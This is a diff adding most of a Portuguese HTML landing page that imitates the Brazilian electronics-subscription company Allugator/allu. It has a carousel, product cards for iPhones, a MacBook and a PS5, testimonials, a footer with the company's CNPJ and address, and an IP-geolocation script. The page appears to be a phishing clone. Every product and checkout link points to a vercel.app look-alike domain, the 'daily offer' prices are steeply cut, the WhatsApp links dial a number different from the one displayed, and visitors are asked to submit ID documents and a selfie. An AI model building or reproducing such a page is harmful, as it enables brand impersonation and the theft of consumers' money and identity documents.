+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.59 13.41L11 3.83A2 2 0 009.59 3.17H4a1 1 0 00-1 1v5.59a2 2 0 00.59 1.41l9.58 9.58a2 2 0 002.83 0l4.59-4.59a2 2 0 000-2.83z"/><circle cx="7" cy="7" r="1"/></svg>
+          Oferta do dia
+        </div>
+        <img src="https://images.digital.allugator.com/products/ip171.png"
+          alt="iPhone 17"
+          onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22120%22 height=%22170%22><rect width=%22120%22 height=%22170%22 rx=%2214%22 fill=%22%23e8e8e8%22/></svg>'">
+      </div>
+      <div class="pbody">
+        <div class="pname">IPhone 17</div>
+        <div class="pdesc">Chip A19, Câmera Fusion 48...</div>
+        <div class="pfrom">parcelas a partir de</div>
+        <div class="pprices">
+          <span class="pold">R$289,90</span>
+          <span class="pnew-badge">R$121,15</span>
+        </div>
+      </div>
+    </a>
+
+    <!-- iPhone 16 -->
+    <a class="pcard" href="https://allugatorbr.vercel.app/contrato-16">
+      <div class="pthumb">
+        <div class="poferta-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.59 13.41L11 3.83A2 2 0 009.59 3.17H4a1 1 0 00-1 1v5.59a2 2 0 00.59 1.41l9.58 9.58a2 2 0 002.83 0l4.59-4.59a2 2 0 000-2.83z"/><circle cx="7" cy="7" r="1"/></svg>
+          Oferta do dia
+        </div>
+        <img src="https://images.digital.allugator.com/products/iph161.png"
+          alt="iPhone 16"
+          onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22120%22 height=%22170%22><rect width=%22120%22 height=%22170%22 rx=%2214%22 fill=%22%23e8e8e8%22/></svg>'">
+      </div>
+      <div class="pbody">
+        <div class="pname">IPhone 16</div>
+        <div class="pdesc">Chip A18 com GPU de 5 núcleos...</div>
+        <div class="pfrom">parcelas a partir de</div>
+        <div class="pprices">
+          <span class="pold">R$243,99</span>
+          <span class="pnew-badge">R$103,15</span>
+        </div>
+      </div>
+    </a>
+
+    <!-- MacBook Air -->
+    <a class="pcard" href="https://allugatorbr.vercel.app/contrato-macbook-m4">
+      <div class="pthumb">
+        <img src="https://images.digital.allugator.com/products/mba1.png"
+          alt="MacBook Air M4"
+          onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22120%22><rect width=%22150%22 height=%22120%22 rx=%2210%22 fill=%22%23e8e8e8%22/></svg>'">
+      </div>
+      <div class="pbody">
+        <div class="pname">MacBook Air M4</div>
+        <div class="pdesc">Chip M4, Liquid Retina 13"...</div>
+        <div class="pfrom">parcelas a partir de</div>
+        <div class="pprices"><span class="pnew"><sup>R$</sup>249,90</span></div>
+      </div>
+    </a>
+
+  </div>
+
+  <!-- CTA -->
+  <div class="btn-assinar" onclick="location.href='https://allugatorbr.vercel.app/catalogo'">Começar a assinar &nbsp;→</div>
+</div>
+
+<!-- HOW IT WORKS -->
+<div class="how-section">
+  <div class="how-title">Como funciona assinar?</div>
+  <div class="how-cards">
+
+    <div class="how-card">
+      <div class="how-card-top">
+        <div class="how-num">1</div>
+        <!-- cursor arrow icon -->
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:26px;height:26px;color:var(--green)"><path d="M5 3l14 9-7 1-4 7-3-17z"/></svg>
+      </div>
+      <h3>Escolha seu eletrônico e o plano ideal pra você</h3>
+      <p>Escolha o produto que você quer e o plano de fidelidade que mais combina com você. Você realiza o pagamento e assina um <a href="https://www.allugator.com/how-it-works">contrato</a>.</p>
+    </div>
+
+    <div class="how-card">
+      <div class="how-card-top">
+        <div class="how-num">2</div>
+        <!-- checkmark -->
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:26px;height:26px;color:var(--green)"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+      </div>
+      <h3>Envie seus documentos de forma segura</h3>
+      <p>Envie uma foto do comprovante de residência, documento com foto e uma selfie com documento para análise e aprovação.</p>
+    </div>
+
+    <div class="how-card">
+      <div class="how-card-top">
+        <div class="how-num">3</div>
+        <!-- truck -->
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:26px;height:26px;color:var(--green)"><rect x="1" y="3" width="15" height="13" rx="2"/><path d="M16 8h4l3 3v5h-7V8z"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>
+      </div>
+      <h3>Aproveite sua assinatura com todo o suporte allu</h3>
+      <p>Receba seu produto e use sem dor de cabeça e com a melhor proteção possível.</p>
+    </div>
+
+    <div class="how-card">
+      <div class="how-card-top">
+        <div class="how-num">4</div>
+        <!-- upload/future -->
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:26px;height:26px;color:var(--green)"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0018 9h-1.26A8 8 0 103 16.3"/></svg>
+      </div>
+      <h3>Defina seu futuro:</h3>
+      <p>Após a fidelidade, siga com o aparelho, troque por um novo ou devolva sem custos. Conte com nosso suporte.</p>
+    </div>
+
+  </div>
+  <div class="btn-assinar" onclick="location.href='https://allugatorbr.vercel.app/catalogo'" style="margin-top:18px">Começar a assinar &nbsp;→</div>
+</div>
+
+<!-- COMPARE -->
+<div class="compare-section">
+  <h2 class="compare-headline"><em>Assinar</em> é melhor<br>do que comprar</h2>
+
+  <div class="ccard-bad">
+    <div class="ccard-bad-title">Comprar na loja</div>
+    <ul class="clist-bad">
+      <li>
+        <div class="x-icon">✕</div>
+        Prende limite do cartão
+      </li>
+      <li>
+        <div class="x-icon">✕</div>
+        Necessidade de contratação de seguro
+      </li>
+      <li>
+        <div class="x-icon">✕</div>
+        Desvalorização na revenda do aparelho.
+      </li>
+    </ul>
+  </div>
+
+  <div class="ccard-good">
+    <div class="ccard-good-badge">MELHOR CUSTO BENEFÍCIO</div>
+    <div class="ccard-good-title">Assinar na allu.</div>
+    <ul class="clist-good">
+      <li>
+        <div class="check-icon">✓</div>
+        Pagamento mês a mês
+      </li>
+      <li>
+        <div class="check-icon">✓</div>
+        Cobertura roubo, furto qualificado e danos
+      </li>
+      <li>
+        <div class="check-icon">✓</div>
+        Assistência técnica sem burocracia
+      </li>
+      <li>
+        <div class="check-icon">✓</div>
+        Liberdade para trocar de modelo quando quiser
+      </li>
+    </ul>
+  </div>
+</div>
+
+<!-- BENEFITS (inline icon style) -->
+<div class="benefits-section">
+  <div class="benefit-item">
+    <div class="benefit-top">
+      <!-- coin/dollar circle -->
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><path d="M12 6v2m0 8v2M9.5 9.5C9.5 8.12 10.62 7 12 7s2.5 1.12 2.5 2.5S13.38 12 12 12s-2.5 1.12-2.5 2.5S10.62 17 12 17"/></svg>
+      <span class="benefit-title">Pagamento Mensal</span>
+    </div>
+    <div class="benefit-desc">Pagamento no cartão de crédito ou pix automático mês a mês, previsível e <b>sem ocupar o seu limite</b>.</div>
+  </div>
+  <div class="benefit-item">
+    <div class="benefit-top">
+      <!-- shield -->
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      <span class="benefit-title">Cobertura completa</span>
+    </div>
+    <div class="benefit-desc">Cobertura completa contra roubo e furto qualificado, além de assistência técnica e cobertura contra danos.</div>
+  </div>
+  <div class="benefit-item">
+    <div class="benefit-top">
+      <!-- refresh -->
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>
+      <span class="benefit-title">Liberdade para trocar</span>
+    </div>
+    <div class="benefit-desc">Liberdade para usar pelo tempo que preferir e trocar de modelo quando precisar, ou quiser.</div>
+  </div>
+</div>
+
+<!-- RECOMENDADOS -->
+<div class="products-section" style="padding-top:8px">
+  <div class="products-header">
+    <span class="sec-label">Recomendados da allu</span>
+    <a href="https://allugatorbr.vercel.app/catalogo" class="see-all">Ver todos</a>
+  </div>
+  <div class="products-scroll">
+
+    <a class="pcard" href="https://allugatorbr.vercel.app/contrato-16">
+      <div class="pthumb">
+        <div class="poferta-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.59 13.41L11 3.83A2 2 0 009.59 3.17H4a1 1 0 00-1 1v5.59a2 2 0 00.59 1.41l9.58 9.58a2 2 0 002.83 0l4.59-4.59a2 2 0 000-2.83z"/><circle cx="7" cy="7" r="1"/></svg>
+          Oferta do dia
+        </div>
+        <img src="https://images.digital.allugator.com/products/iph161.png" alt="iPhone 16" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22120%22 height=%22170%22><rect width=%22120%22 height=%22170%22 rx=%2214%22 fill=%22%23e8e8e8%22/></svg>'">
+      </div>
+      <div class="pbody">
+        <div class="pname">IPhone 16</div>
+        <div class="pdesc">Chip A18, Super Retina XDR.</div>
+        <div class="pfrom">parcelas a partir de</div>
+        <div class="pprices"><span class="pold">R$243,99</span><span class="pnew-badge">R$103,15</span></div>
+      </div>
+    </a>
+
+    <a class="pcard" href="https://allugatorbr.vercel.app/contrato-macbook-m4">
+      <div class="pthumb">
+        <img src="https://images.digital.allugator.com/products/mba1.png" alt="MacBook Air" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22120%22><rect width=%22150%22 height=%22120%22 rx=%2210%22 fill=%22%23e8e8e8%22/></svg>'">
+      </div>
+      <div class="pbody">
+        <div class="pname">MacBook Air M4</div>
+        <div class="pdesc">Chip M4, 18h de bateria.</div>
+        <div class="pfrom">parcelas a partir de</div>
+        <div class="pprices"><span class="pnew"><sup>R$</sup>249,90</span></div>
+      </div>
+    </a>
+
+    <a class="pcard" href="https://allugatorbr.vercel.app/contrato-ps5">
+      <div class="pthumb">
+        <img src="https://images.digital.allugator.com/products/ps5-pro-4.png" alt="PS5" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22120%22><rect width=%22150%22 height=%22120%22 rx=%2210%22 fill=%22%23e8e8e8%22/></svg>'">
+      </div>
+      <div class="pbody">
+        <div class="pname">PlayStation 5 Pro</div>
+        <div class="pdesc">SSD ultrarrápido + DualSense.</div>
+        <div class="pfrom">parcelas a partir de</div>
+        <div class="pprices"><span class="pnew"><sup>R$</sup>189,90</span></div>
+      </div>
+    </a>
+
+  </div>
+  <div class="btn-assinar" onclick="location.href='https://allugatorbr.vercel.app/catalogo'">Começar a assinar &nbsp;→</div>
+</div>
+
+<!-- TESTIMONIALS — dark green bg -->
+<div class="testi-section">
+  <div class="testi-intro">
+    <h2>Quem assina ama</h2>
+    <p>E NÃO É A GENTE QUEM DIZ</p>
+  </div>
+  <div class="testi-count">
+    <div class="big">+de 45.000</div>
+    <div class="label">clientes já aproveitam</div>
+  </div>
+  <div class="t-scroll">
+
+    <div class="tcard">
+      <div class="ttop">
+        <div class="tavatar">
+          <img src="https://www.allugator.com/home/customers/customer_1.webp" alt="Anne Caroline" onerror="this.parentElement.style.background='linear-gradient(135deg,#00C27C,#0098E0)';this.style.display='none'">
+        </div>
+        <div>
+          <div class="tname">ANNE CAROLINE</div>
+          <div class="stars">★★★★★</div>
+        </div>
+      </div>
+      <p class="ttext">"As vezes nem é sobre o que 'compensa mais' e sim sobre o que é possível para a pessoa. Eu não conseguiria pagar o iPhone, seguro e todos os acessórios, e na Allu eu consegui"</p>
+    </div>
+
+    <div class="tcard">
+      <div class="ttop">
+        <div class="tavatar">
+          <img src="https://www.allugator.com/home/customers/customer_2.webp" alt="Jéssica" onerror="this.parentElement.style.background='linear-gradient(135deg,#00C27C,#006EDB)';this.style.display='none'">
+        </div>
+        <div>
+          <div class="tname">JÉSSICA SOUZA</div>
+          <div class="stars">★★★★★</div>
+        </div>
+      </div>
+      <p class="ttext">"Solicitei dia 01/09 e fui aprovada no dia seguinte. Meu pedido chegou rápido, tudo certinho e bem embalado, eu moro na baixada e a entrega para mim foi mais rápido."</p>
+    </div>
+
+    <div class="tcard">
+      <div class="ttop">
+        <div class="tavatar">
+          <img src="https://www.allugator.com/home/customers/customer_3.webp" alt="Mayara" onerror="this.parentElement.style.background='linear-gradient(135deg,#6A11CB,#2575FC)';this.style.display='none'">
+        </div>
+        <div>
+          <div class="tname">MAYARA ESTRELLA</div>
+          <div class="stars">★★★★★</div>
+        </div>
+      </div>
+      <p class="ttext">"Assinamos um Playstation 5. Meu filho não tinha essa felicidade há muito tempo! Era o sonho dele. Muito obrigada!"</p>
+    </div>
+
+  </div>
+  <div class="btn-assinar-w" onclick="location.href='https://allugatorbr.vercel.app/catalogo'">Começar a assinar &nbsp;→</div>
+</div>
+
+<!-- TRUST / PAGAMENTOS -->
+<div class="trust-section">
+  <div class="trust-grid">
+    <div class="trust-item">
+      <div class="ticon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v2m0 8v2m-3.5-7.5C8.5 7.12 10.12 6 12 6s3.5 1.12 3.5 2.5-1.62 2.5-3.5 2.5-3.5 1.12-3.5 2.5S10.12 18 12 18s3.5-1.12 3.5-2.5"/></svg>
+      </div>
+      <div class="t-title">Pagamentos</div>
+      <div class="t-desc">Pagamento recorrente realizado mês a mês, sem ocupar o limite do seu cartão de crédito</div>
+    </div>
+    <div class="trust-item">
+      <div class="ticon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="1" y="3" width="15" height="13" rx="2"/><path d="M16 8h4l3 3v5h-7V8z"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>
+      </div>
+      <div class="t-title">Frete grátis</div>
+      <div class="t-desc">Entregamos para todo o Brasil.</div>
+    </div>
+    <div class="trust-item">
+      <div class="ticon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      </div>
+      <div class="t-title">Proteção</div>
+      <div class="t-desc">Garantimos cobertura contra danos, roubo e furto qualificado</div>
+    </div>
+    <div class="trust-item">
+      <div class="ticon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
+      </div>
+      <div class="t-title">Tire suas dúvidas</div>
+      <div class="t-desc">Para tirar dúvidas entre em contato via wpp em <a href="https://api.whatsapp.com/send?phone=553192100124" style="color:var(--black);font-weight:700">+55 31 93618-2299</a> ou acesse nossa <a href="https://ajuda.allugator.com/" style="color:var(--green);text-decoration:underline">Central de Ajuda</a></div>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+
+  <!-- social -->
+  <div class="footer-trust">
+    <div class="footer-trust-title">Nossas Redes Sociais</div>
+    <div class="social-icons">
+      <!-- Instagram -->
+      <a href="https://www.instagram.com/allu.oficial/" class="si-ig" target="_blank">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="2" width="20" height="20" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.5" cy="6.5" r=".5" fill="currentColor"/></svg>
+      </a>
+      <!-- X/Twitter -->
+      <a href="https://twitter.com/allu_oficial" class="si-x" target="_blank">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+      </a>
+      <!-- Facebook -->
+      <a href="https://www.facebook.com/vemserallu" class="si-fb" target="_blank">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+      </a>
+      <!-- TikTok -->
+      <a href="https://www.tiktok.com/@allu.oficial" class="si-tk" target="_blank">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.28 8.28 0 004.84 1.54V6.78a4.85 4.85 0 01-1.07-.09z"/></svg>
+      </a>
+    </div>
+  </div>
+
+  <!-- nav columns -->
+  <div class="footer-nav">
+    <div class="fn-col">
+      <h4>Sobre Nós</h4>
+      <ul>
+        <li><a href="#">Trabalhe Conosco</a></li>
+        <li><a href="https://blog.allugator.com">Blog</a></li>
+        <li><a href="#">allu invest</a></li>
+      </ul>
+    </div>
+    <div class="fn-col">
+      <h4>Serviços</h4>
+      <ul>
+        <li><a href="https://allugatorbr.vercel.app/catalogo">Produtos</a></li>
+      </ul>
+    </div>
+    <div class="fn-col">
+      <h4>Segurança</h4>
+      <ul>
+        <li><a href="#">Termos de uso</a></li>
+        <li><a href="#">Proteção de dados</a></li>
+      </ul>
+    </div>
+    <div class="fn-col">
+      <h4>Suporte</h4>
+      <ul>
+        <li><a href="https://ajuda.allugator.com/">Central de ajuda</a></li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- contacts -->
+  <div class="footer-contacts">
+    <div class="contact-col">
+      <div class="c-label">e-mail</div>
+      <a href="mailto:contato@allugator.com" class="c-val">contato@allugator.com</a>
+    </div>
+    <div class="contact-col">
+      <div class="c-label">Whatsapp</div>
+      <a href="https://api.whatsapp.com/send?phone=553192100124" class="c-val">+55 31 93618-2299</a>
+    </div>
+  </div>
+
+  <!-- badges & payment flags -->
+  <div class="footer-badges">
+    <div class="badges-row">
+      <div class="badge-ra">
+        <div class="badge-ra-check">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="badge-ra-text">Verificada por<br><span>Reclame</span>AQUI</div>
+      </div>
+      <div class="badge-pagar">
+        <span>pagar<b>.me</b></span>
+      </div>
+    </div>
+    <div class="payment-flags-row">
+      <!-- card brand icons as text flags -->
+      <div class="pflag"><span class="pflag-txt" style="color:#EB001B;font-weight:900">●</span><span class="pflag-txt" style="color:#F79E1B;font-weight:900;margin-left:-4px">●</span></div>
+      <div class="pflag"><span class="pflag-txt" style="color:#1A1F71;font-weight:900">VISA</span></div>
+      <div class="pflag"><span class="pflag-txt">elo</span></div>
+      <div class="pflag"><span class="pflag-txt" style="color:#016FD0">AMEX</span></div>
+      <div class="pflag"><span class="pflag-txt" style="font-size:9px">DISCOVER</span></div>
+      <div class="pflag"><span class="pflag-txt" style="font-size:9px">HIPER</span></div>
+      <div class="pflag"><span class="pflag-txt" style="color:#EE4B2B;font-size:9px">JCB</span></div>
+      <div class="pflag"><span class="pflag-txt" style="font-size:9px">paypal</span></div>
+    </div>
+  </div>
+
+  <!-- bottom -->
+  <div class="footer-bottom">
+    <p>Avenida Raja Gabáglia, 2664, Estoril<br>Belo Horizonte - MG 30494-170</p>
+    <p style="margin-top:4px">CNPJ: 25.053.921/0001-43</p>
+    <p style="margin-top:4px">©Allugator Assinatura de Eletrônicos 2026</p>
+  </div>
+
+</footer>
+
+<!-- WA FLOAT -->
+<a href="https://api.whatsapp.com/send?phone=553192100124" class="wa-float" target="_blank">
+  <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+</a>
+
+<script>
+// HERO CAROUSEL
+const track = document.getElementById('heroTrack');
+const dots  = document.querySelectorAll('.dot');
+const N     = 5;
+let cur = 0, timer;
+
+function goSlide(n) {
+  cur = (n + N) % N;
+  track.style.transform = `translateX(-${cur * 100}%)`;
+  dots.forEach((d, i) => d.classList.toggle('active', i === cur));
+}
+function startAuto() { timer = setInterval(() => goSlide(cur + 1), 4500); }
+function stopAuto()  { clearInterval(timer); }
+startAuto();
+
+// swipe
+let sx = 0;
+track.addEventListener('touchstart', e => { sx = e.touches[0].clientX; stopAuto(); }, {passive:true});
+track.addEventListener('touchend',   e => {
+  const d = sx - e.changedTouches[0].clientX;
+  if (Math.abs(d) > 40) goSlide(d > 0 ? cur + 1 : cur - 1);
+  startAuto();
+}, {passive:true});
+
+// ── LOCALIZAÇÃO AUTOMÁTICA (CEP row) ──
+const cepText  = document.getElementById('cepText');
+const cepRow   = document.getElementById('cepRow');
+const LOC_KEY  = 'allu_location_label';
+const LOC_TIME = 'allu_location_time';
+const LOC_TTL  = 24 * 60 * 60 * 1000; // 24h
+
+function setLocationLabel(label, persist = true) {
+  cepText.textContent = label;
+  if (persist) {
+    try {
+      localStorage.setItem(LOC_KEY, label);
+      localStorage.setItem(LOC_TIME, String(Date.now()));
+    } catch (e) {}
+  }
+}
+
+async function reverseGeocode(lat, lon) {
+  const res = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=pt`);
+  if (!res.ok) throw new Error('reverse geocode failed');
+  const data = await res.json();
+  // "locality" tende a ser mais granular (bairro/cidade real) que "city",
+  // que às vezes cai pra sede da região metropolitana mais próxima.
+  const place = data.locality || data.city || data.principalSubdivision || '';
+  const ufRaw = data.principalSubdivisionCode || '';
+  const uf = ufRaw.includes('-') ? ufRaw.split('-')[1] : ufRaw;
+  if (!place) throw new Error('no place');
+  return uf ? `Entregando em ${place} - ${uf}` : `Entregando em ${place}`;
+}
+
+async function ipGeocode() {
+  const res = await fetch('https://ipapi.co/json/');
+  if (!res.ok) throw new Error('ip geocode failed');
+  const data = await res.json();
+  const city = data.city || '';
+  const uf = data.region_code || '';
+  if (!city) throw new Error('no city');
+  // deixa claro que é uma estimativa por IP (menos precisa que o GPS)
+  return uf ? `Entregando perto de ${city} - ${uf}` : `Entregando perto de ${city}`;
+}
+
+function getBrowserLocation(highAccuracy) {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject(new Error('no geolocation'));
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve(pos.coords),
+      err => reject(err),
+      { enableHighAccuracy: highAccuracy, timeout: highAccuracy ? 10000 : 5000, maximumAge: 0 }
+    );
+  });
+}
+
+async function detectLocation() {
+  // usa cache recente, se existir
+  try {
+    const cached = localStorage.getItem(LOC_KEY);
+    const cachedAt = Number(localStorage.getItem(LOC_TIME) || 0);
+    if (cached && (Date.now() - cachedAt) < LOC_TTL) {
+      cepText.textContent = cached;
+      return;
+    }
+  } catch (e) {}
+
+  // geolocalização por IP, direto — não pede permissão do navegador
+  try {
+    const label = await ipGeocode();
+    setLocationLabel(label);
+    return;
+  } catch (e) { /* segue pro fallback final */ }
+
+  // 4) fallback final: texto padrão
+  cepText.textContent = 'Informe CEP';
+}
+
+detectLocation();
+
+// clique no campo permite digitar o CEP manualmente
+cepRow.addEventListener('click', async () => {
+  const input = prompt('Digite seu CEP:');
+  if (!input) return;
+  const cep = input.replace(/\D/g, '');
+  if (cep.length !== 8) { alert('CEP inválido. Digite os 8 números do CEP.'); return; }
+
+  const previous = cepText.textContent;
+  cepText.textContent = 'Buscando...';
+  try {
+    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+    const data = await res.json();
+    if (data.erro) throw new Error('CEP não encontrado');
+    const label = `Entregando em ${data.localidade} - ${data.uf}`;
+    setLocationLabel(label);
+  } catch (e) {
+    cepText.textContent = previous;
+    alert('Não foi possível localizar esse CEP.');
+  }
+});
+</script>
+</body>
+</html>
